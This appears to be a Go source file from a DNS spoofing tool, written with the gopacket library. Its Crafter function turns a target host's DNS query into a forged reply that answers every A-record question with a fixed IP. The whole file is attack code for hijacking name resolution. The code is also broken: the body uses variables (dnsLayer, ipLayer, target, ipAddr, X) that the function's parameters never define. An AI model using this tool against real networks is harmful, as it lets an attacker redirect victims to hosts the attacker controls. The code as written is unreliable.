package SPOOFER

import (
	"fmt"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

func Crafter(EL *layers.Ethernet, IL *layers.IPv4, DNL *layers.DNS, UDL *layers.UDP) []byte {
	if dnsLayer.QR || ipLayer.SrcIP.String() != target {
		return nil
	} else {
		fmt.Println(dnsLayer.QDCount, ipLayer.SrcIP.String(), dnsLayer.NSCount)
	}
	ethMac := ethernetLayer.DstMAC
	ethernetLayer.DstMAC = ethernetLayer.SrcMAC
	ethernetLayer.SrcMAC = ethMac
	ipSrc := ipLayer.SrcIP
	ipLayer.SrcIP = ipLayer.DstIP
	ipLayer.DstIP = ipSrc
	srcPort := udpLayer.SrcPort
	udpLayer.SrcPort = udpLayer.DstPort
	udpLayer.DstPort = srcPort
	X = udpLayer.SetNetworkLayerForChecksum(IL)
	if X != nil {
		fmt.Println("|+| ERROR -> Could not set the new cheksum for the UDP layer got error -> ", X)
	}
	var answer layers.DNSResourceRecord
	answer.Type = layers.DNSTypeA
	answer.Class = layers.DNSClassIN
	answer.TTL = 200
	answer.IP = ipAddr
	dnsLayer.QR = true
	for _, q := range dnsLayer.Questions {
		if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
			fmt.Println(q)
			continue
		}
		answer.Name = q.Name
		dnsLayer.Answers = append(dnsLayer.Answers, answer)
		dnsLayer.ANCount = dnsLayer.ANCount + 1
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	X = gopacket.SerializeLayers(buf, opts, EL, IL, UDL, DNL)
	if X != nil {
		fmt.Println("|-| Error: Got error when trying to serialize the new created layers -> ", X)
	}
	return buf.Bytes()
}
